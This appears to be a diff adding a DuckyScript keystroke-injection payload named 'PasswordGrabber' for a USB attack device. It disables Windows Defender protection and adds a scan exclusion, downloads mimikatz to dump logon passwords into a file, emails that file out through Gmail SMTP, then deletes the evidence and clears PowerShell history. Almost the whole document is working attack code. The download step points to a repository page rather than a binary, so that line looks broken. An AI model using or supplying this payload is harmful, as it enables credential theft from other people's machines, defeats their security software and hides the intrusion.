@@ -1,0 +1,144 @@
+REM Title: PasswordGrabber
+REM Arthor Slurpy https://github.com/SlurpyBecomeDev
+DEFAULT_DELAY 350
+DELAY 1000
+CTRL ESC
+DELAY 300
+STRING defender
+DELAY 300
+ENTER
+DELAY 500
+ENTER
+TAB
+TAB
+TAB
+DELAY 300
+TAB
+TAB
+TAB
+DELAY 300
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 300
+TAB
+TAB
+DELAY 50
+TAB
+TAB
+DELAY 50
+TAB
+TAB
+DELAY 50
+TAB
+TAB
+DELAY 50
+TAB
+TAB
+DELAY 300
+DOWN
+DELAY 300
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 300
+ALT F4
+DELAY 300
+CTRL ESC
+DELAY 300
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 300
+TAB
+TAB
+DELAY 300
+ENTER
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+STRING exit
+ENTER
+GUI r
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 300
+TAB
+TAB
+DELAY 300
+ENTER
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/ParrotSec/mimikatz','%temp%\pw.exe')
+ENTER
+DELAY 4000
+STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
+ENTER
+STRING privilege::debug
+ENTER
+STRING sekurlsa::logonPasswords full
+ENTER
+STRING exit
+ENTER
+STRING del %TEMP%\pw.exe
+ENTER
+STRING exit
+ENTER
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 300
+TAB
+TAB
+DELAY 100
+ENTER
+DELAY 50
+STRING Remove-MpPreference -ExclusionPath C:\Users
+ENTER
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL ADRESS BEFEORE @'
+SHIFT 2
+STRING gmail.com', 'PASSWORD TO YOUR EMAIL');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'EMAIL ADRESS BEFEORE @
+SHIFT 2
+STRING gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('EMAIL ADRESS BEFEORE @
+SHIFT 2
+STRING gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'password was taken'
+ENTER
+STRING $ReportEmail.Body = 'Password here'
+ENTER
+STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 300
+TAB
+TAB
+DELAY 100
+ENTER
+DELAY 50
+STRING del c:\pwlog.txt
+ENTER
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+STRING exit
+ENTER
+GUI l
